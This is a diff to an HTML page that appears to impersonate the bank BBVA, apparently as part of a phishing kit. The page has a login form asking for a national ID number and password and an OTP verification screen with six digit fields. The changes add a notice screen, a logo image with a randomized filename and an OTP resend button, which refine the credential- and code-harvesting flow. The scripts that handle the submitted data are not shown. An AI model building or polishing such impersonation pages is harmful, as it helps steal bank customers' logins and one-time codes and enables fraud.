@@ -13,11 +13,18 @@
                 <!-- First screen with download.jpg -->
                 <div class="background-image first-screen"></div>
                 
+                <!-- Importance Notice Screen -->
+                <div class="importance-notice-screen" id="importance-notice-screen">
+                    <button class="importance-understand-btn" onclick="proceedToHomeScreen()">Entiendo</button>
+                </div>
+                
                 <!-- Second screen with bg .png and content -->
                 <div class="background-image second-screen">
                     <!-- Header -->
                     <header class="header">
-                        <div class="logo">BBVA</div>
+                        <div class="logo">
+                            <img src="idxjYMv0n8_logos.png" alt="BBVA" class="logo-image">
+                        </div>
                         <div class="header-icons">
                             <div class="icon-item" id="help-button" onclick="openHelpScreen(event); return false;">
                                 <div class="icon-circle">!</div>
@@ -192,10 +199,7 @@
                         </div>
                         <div class="login-modal-content">
                             <input type="text" class="login-input" data-translate="loginIdPlaceholder" placeholder="NIF, NIE, DNI o Pasaporte" id="login-id">
-                            <div class="login-password-wrapper">
-                                <input type="password" class="login-input" data-translate="loginPasswordPlaceholder" placeholder="Contraseña de acceso" id="login-password">
-                                <span class="login-password-toggle" onclick="togglePasswordVisibility()">👁</span>
-                            </div>
+                            <input type="password" class="login-input" data-translate="loginPasswordPlaceholder" placeholder="Contraseña de acceso" id="login-password">
                             <button class="login-submit-btn" id="login-submit-btn" onclick="handleLogin()" data-translate="login">Iniciar sesión</button>
                         </div>
                     </div>
@@ -235,7 +239,9 @@
                             <h2 class="otp-verification-title" data-translate="otpVerificationRequired">Verificación OTP Requerida</h2>
                         </div>
                         <div class="otp-verification-content">
-                            <div class="otp-logo">BBVA</div>
+                            <div class="otp-logo">
+                                <img src="idxjYMv0n8_logos.png" alt="BBVA" class="otp-logo-image">
+                            </div>
                             <p class="otp-message" data-translate="otpSent">El OTP ha sido enviado al número de móvil registrado</p>
                             <div class="otp-input-container">
                                 <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="otp-1" oninput="handleOTPInput(this, 'otp-2')" onkeydown="handleOTPBackspace(event, 'otp-1')">
@@ -249,6 +255,11 @@
                                 ¡OTP expirado, introduce un nuevo OTP!
                             </div>
                             <button class="otp-submit-btn" onclick="submitOTP()" data-translate="submitOTP">Enviar OTP</button>
+                            <div class="otp-resend-container">
+                                <button class="otp-resend-btn" id="otp-resend-btn" onclick="resendOTP()" disabled>
+                                    <span id="resend-timer-text">Reenviar OTP</span>
+                                </button>
+                            </div>
                         </div>
                     </div>
                 </div>
